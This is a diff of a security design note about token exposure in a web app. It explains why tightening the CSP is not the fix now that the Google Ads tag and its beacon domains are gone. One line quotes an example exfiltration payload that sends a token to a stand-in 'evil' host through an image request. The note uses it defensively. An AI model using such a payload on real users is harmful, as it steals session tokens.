@@ -275,18 +275,16 @@ next reviewer finds the analysis instead of re-deriving it.
 
 **Why the CSP is not the fix.** Narrowing `connectSrc` alone is theatre while
 `imgSrc: 'https:'` stands — `new Image().src = 'https://evil/?t=' + token` exfiltrates
-just as well, and `form-action` and top-level navigation remain besides. Both
-directives are load-bearing for the Google Ads tag
-([`public/scripts/gtag.js`](../../public/scripts/gtag.js) — the `googletagmanager`,
-`googleadservices`, `www.google.com` and `*.doubleclick.net` measurement beacons ride
-on them, as the `scriptSrc` comment in `app-middleware.js` notes), so tightening
-them risks silently losing conversion data — a missed beacon domain produces no error.
-An allowlist is worth doing eventually, but as defence in depth, not as this fix.
+just as well, and `form-action` and top-level navigation remain besides. An allowlist is
+worth doing eventually, but as defence in depth, not as this fix.
 
-Note that those beacons are **conditional in practice**: `gtag.js` returns before the
-loader is appended when the visitor sends Global Privacy Control or has opted out via
-privacy.html §16.3, so on those loads none of the four ad origins is contacted at all.
-The CSP allowance is the ceiling, not a description of every request.
+The Google Ads tag that used to lean on these two directives is **gone**, and with it the
+`googletagmanager`, `googleadservices`, `www.google.com` and `*.doubleclick.net` entries
+in `scriptSrc`/`frameSrc`. That removes the old reason not to tighten `imgSrc` and
+`connectSrc`: no third-party beacon rides on them now, so narrowing them no longer risks
+silently losing measurement data. The remaining Google origins in `scriptSrc`
+(`accounts.google.com`, `apis.google.com`, `www.gstatic.com`) are Google Sign-In and are
+unrelated to advertising.
 
 **Why it is not a one-line change.** The real fix is an `httpOnly` cookie, and the
 security benefit arrives only once the browser stops holding a readable token —
